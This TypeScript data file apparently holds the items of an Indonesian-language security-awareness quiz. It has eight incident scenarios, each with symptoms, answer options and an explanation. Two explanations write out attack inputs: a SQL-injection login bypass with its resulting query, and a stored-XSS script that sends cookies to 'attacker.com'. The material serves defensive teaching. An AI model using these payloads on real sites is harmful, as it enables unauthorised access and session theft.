export type ScenarioDifficulty = 'mudah' | 'menengah' | 'sulit';

export interface ScenarioOption {
  text: string;
  isCorrect: boolean;
}

export interface Scenario {
  id: string;
  attackId: string;
  difficulty: ScenarioDifficulty;
  title: string;
  context: string;
  symptoms: string[];
  options: ScenarioOption[];
  explanation: string;
}

export const SCENARIOS: Scenario[] = [
  {
    id: 'sc-phishing-1',
    attackId: 'phishing',
    difficulty: 'mudah',
    title: 'Email Mencurigakan dari "Bank"',
    context:
      'Anda menerima email dari "security@bankcentral-update.com" dengan subjek "⚠️ Akun Anda Akan Diblokir dalam 24 Jam". Email meminta Anda klik tautan dan verifikasi data karena "aktivitas mencurigakan".',
    symptoms: [
      'Domain pengirim: bankcentral-update.com (bukan bankcentral.com)',
      'Menciptakan rasa urgensi ("24 jam", "diblokir")',
      'Tautan mengarah ke https://secure-bankcentral.xyz',
      'Meminta username, password, dan PIN sekaligus',
    ],
    options: [
      { text: 'Phishing — domain palsu dan taktik urgensi untuk mencuri kredensial', isCorrect: true },
      { text: 'Notifikasi keamanan sah dari bank yang sistem email-nya bermasalah', isCorrect: false },
      { text: 'Serangan DDoS yang dialihkan ke email pengguna', isCorrect: false },
      { text: 'SQL Injection melalui form login bank', isCorrect: false },
    ],
    explanation:
      'Ini adalah phishing klasik. Tanda-tanda: domain typosquatting (bankcentral-update.com), taktik urgency, URL redirect ke domain asing (.xyz), dan permintaan semua faktor autentikasi sekaligus. Bank tidak pernah meminta PIN melalui email.',
  },
  {
    id: 'sc-ransomware-1',
    attackId: 'ransomware',
    difficulty: 'menengah',
    title: 'File Kantor Tiba-tiba Tak Bisa Dibuka',
    context:
      'Staf keuangan melapor semua file Excel dan Word berubah ekstensi menjadi ".locked" dan tidak bisa dibuka. Di desktop muncul file "READ_ME_DECRYPT.txt" berisi instruksi untuk mentransfer 3 BTC ke alamat tertentu.',
    symptoms: [
      'Semua file berubah ekstensi menjadi .locked',
      'Volume Shadow Copies tidak bisa diakses',
      'File ransom note muncul di setiap folder',
      'Beberapa antivirus process dihentikan secara paksa',
    ],
    options: [
      { text: 'Ransomware — file dienkripsi dan tebusan diminta untuk kunci dekripsi', isCorrect: true },
      { text: 'File system corruption akibat hardware failure', isCorrect: false },
      { text: 'Insider threat yang menghapus file penting', isCorrect: false },
      { text: 'Virus yang hanya mengganti nama ekstensi tanpa enkripsi nyata', isCorrect: false },
    ],
    explanation:
      'Ini adalah ransomware. Indikator kunci: ekstensi file berubah massal, Shadow Copies dihapus (untuk mencegah recovery), antivirus dinonaktifkan, dan ransom note dengan demand cryptocurrency. Respons: isolasi jaringan segera, jangan bayar tebusan tanpa konsultasi ahli.',
  },
  {
    id: 'sc-sqli-1',
    attackId: 'sqli',
    difficulty: 'menengah',
    title: 'Login Admin Tanpa Password',
    context:
      'Tim keamanan menemukan entri log aneh: seseorang login ke panel admin dengan username "admin\'--" dan password kosong pada pukul 03:22 pagi. Tidak ada akun dengan username tersebut di database.',
    symptoms: [
      'Username mengandung karakter khusus: apostrof dan double-dash',
      'Login berhasil meski password kosong',
      'IP login berasal dari Tor exit node',
      'Log database menunjukkan query anomali pada waktu yang sama',
    ],
    options: [
      { text: 'SQL Injection — karakter SQL menyabotase query autentikasi', isCorrect: true },
      { text: 'Brute force — ribuan percobaan password hingga berhasil', isCorrect: false },
      { text: 'Session hijacking dari cookie admin yang bocor', isCorrect: false },
      { text: 'Backdoor yang dipasang developer sebelumnya', isCorrect: false },
    ],
    explanation:
      'Username "admin\'--" adalah SQL Injection klasik. Apostrof (\'>) menutup string query, lalu "--" mengkomentar sisa query termasuk pengecekan password. Query menjadi: SELECT * FROM users WHERE username=\'admin\' -- AND password=\'...\' — password check diabaikan.',
  },
  {
    id: 'sc-mitm-1',
    attackId: 'mitm',
    difficulty: 'menengah',
    title: 'Transaksi Internet Banking di Kafe',
    context:
      'Seorang karyawan melakukan transfer bank dari laptop di kafe yang menggunakan Wi-Fi gratis "FreeKafeWifi". Besoknya ia mendapat notifikasi transfer tidak dikenal sebesar Rp 15 juta dari akunnya.',
    symptoms: [
      'Menggunakan Wi-Fi publik tanpa verifikasi',
      'Browser sempat menampilkan peringatan sertifikat "tidak aman"',
      'Halaman bank terlihat sama tapi URL menggunakan HTTP bukan HTTPS',
      'Tidak ada 2FA diaktifkan pada akun bank',
    ],
    options: [
      { text: 'MITM Attack — attacker mencegat komunikasi di jaringan Wi-Fi palsu', isCorrect: true },
      { text: 'Phishing — karyawan memasukkan data ke website palsu', isCorrect: false },
      { text: 'Data breach pada server bank', isCorrect: false },
      { text: 'Keylogger pada laptop yang dipinjam di kafe', isCorrect: false },
    ],
    explanation:
      'Ini adalah MITM via rogue Wi-Fi hotspot. Attacker membuat hotspot palsu "FreeKafeWifi", melakukan SSL stripping (menurunkan HTTPS ke HTTP), dan mencegat semua komunikasi termasuk kredensial bank. Tanda kunci: peringatan sertifikat diabaikan dan URL HTTP bukannya HTTPS.',
  },
  {
    id: 'sc-xss-1',
    attackId: 'xss',
    difficulty: 'sulit',
    title: 'Komentar Blog yang Mencuri Sesi',
    context:
      'Sebuah platform blog melaporkan bahwa beberapa akun admin "tiba-tiba logout sendiri" lalu ada aktivitas posting artikel spam. Investigasi menemukan komentar lama yang berisi teks HTML aneh.',
    symptoms: [
      'Komentar mengandung tag <script> yang tersimpan di database',
      'Script dieksekusi setiap kali halaman dengan komentar dibuka',
      'Cookie sesi admin dikirim ke server eksternal',
      'Tidak ada validasi atau sanitasi input pada form komentar',
    ],
    options: [
      { text: 'Stored XSS — skrip berbahaya disimpan dan dieksekusi di browser korban', isCorrect: true },
      { text: 'CSRF — request berbahaya dikirim menggunakan sesi admin', isCorrect: false },
      { text: 'SQL Injection pada tabel komentar untuk modifikasi konten', isCorrect: false },
      { text: 'Brute force pada akun admin secara paralel', isCorrect: false },
    ],
    explanation:
      'Ini adalah Stored XSS (Persistent XSS). Skrip <script>document.location=\'attacker.com/steal?c=\'+document.cookie</script> tersimpan di database dan dieksekusi di browser setiap pengunjung. Sesi cookie admin dicuri dan digunakan untuk posting spam. Pencegahan: HTML encoding output dan Content Security Policy.',
  },
  {
    id: 'sc-ddos-1',
    attackId: 'ddos',
    difficulty: 'mudah',
    title: 'Website E-commerce Mendadak Down',
    context:
      'Website toko online besar mengalami downtime total selama 2 jam saat flash sale. Monitoring menunjukkan traffic naik 500x dari normal dalam hitungan menit, semua dari ribuan IP berbeda di berbagai negara.',
    symptoms: [
      'Traffic naik drastis dari ribuan IP berbeda secara simultan',
      'Server CPU dan bandwidth 100% tersaturasi',
      'Pola request tidak normal: tidak ada browser headers, tidak ada sesi',
      'Traffic datang dari rentang IP yang terdaftar sebagai known botnet',
    ],
    options: [
      { text: 'DDoS Attack — botnet membanjiri server untuk membuat layanan tidak tersedia', isCorrect: true },
      { text: 'Traffic organik flash sale yang melebihi kapasitas server', isCorrect: false },
      { text: 'SQL Injection yang memperlambat seluruh server database', isCorrect: false },
      { text: 'Ransomware yang menginfeksi server web', isCorrect: false },
    ],
    explanation:
      'Ini adalah DDoS volumetric attack menggunakan botnet. Indikator: traffic tiba-tiba masif dari ribuan IP, pola request tidak organik (tidak ada browser headers/sesi normal), IP dari known botnet range. Respons: aktifkan CDN/DDoS protection, rate limiting, null routing IP berbahaya.',
  },
  {
    id: 'sc-credential-stuffing-1',
    attackId: 'credential-stuffing',
    difficulty: 'sulit',
    title: 'Ribuan Login Gagal dalam Semalam',
    context:
      'Sistem monitoring mendeteksi 50.000 percobaan login antara pukul 02:00–04:00 pagi. Uniknya, setiap IP hanya mencoba 1–3 kali login, menggunakan kombinasi email/password yang berbeda-beda. Sekitar 300 login berhasil.',
    symptoms: [
      'Volume percobaan login sangat tinggi tapi tiap IP hanya 1-3 percobaan',
      'Kombinasi email/password sangat spesifik (bukan random)',
      'Waktu serangan: dini hari saat monitoring longgar',
      'User-agent bervariasi tapi pola request identik (otomatis)',
    ],
    options: [
      { text: 'Credential Stuffing — daftar email/password dari breach lain diuji otomatis', isCorrect: true },
      { text: 'Brute force — setiap kombinasi karakter dicoba secara acak', isCorrect: false },
      { text: 'Password spraying — satu password umum dicoba ke semua akun', isCorrect: false },
      { text: 'Dictionary attack — daftar kata umum diuji sebagai password', isCorrect: false },
    ],
    explanation:
      'Ini adalah credential stuffing. Bedanya dari brute force: kombinasi spesifik (bukan random), distribusi IP untuk menghindari rate limiting per IP, dan success rate ~0.6% (tipikal credential stuffing). Datanya dari breach lain seperti LinkedIn, Adobe. Pencegahan: MFA, login anomaly detection, Have I Been Pwned integration.',
  },
  {
    id: 'sc-social-eng-1',
    attackId: 'social-engineering',
    difficulty: 'mudah',
    title: 'Telepon dari "Helpdesk IT"',
    context:
      'Staf HR menerima telepon dari seseorang yang mengaku sebagai tim IT internal. Penelepon mengatakan ada "update sistem darurat" dan meminta staf memberikan password sementara agar "dapat mengakses workstation dari jarak jauh".',
    symptoms: [
      'Penelepon menciptakan urgensi ("darurat", "segera")',
      'Meminta informasi sensitif (password) melalui telepon',
      'Tidak melalui prosedur helpdesk resmi (tiket sistem)',
      'Penelepon tidak dapat memverifikasi identitas dengan badge number',
    ],
    options: [
      { text: 'Vishing (Voice Phishing) — manipulasi telepon untuk mencuri kredensial', isCorrect: true },
      { text: 'Serangan teknis otomatis yang memerlukan input user', isCorrect: false },
      { text: 'Legitimate IT procedure yang kedengarannya mencurigakan', isCorrect: false },
      { text: 'Insider threat dari karyawan IT sendiri', isCorrect: false },
    ],
    explanation:
      'Ini adalah vishing (voice phishing) — social engineering melalui telepon. Tanda merah: meminta password via telepon (IT yang sah tidak pernah minta password), urgensi buatan, tidak ada tiket resmi, tidak bisa verifikasi identitas. Respons yang benar: tutup telepon, verifikasi ke IT langsung via email/sistem tiket resmi.',
  },
];
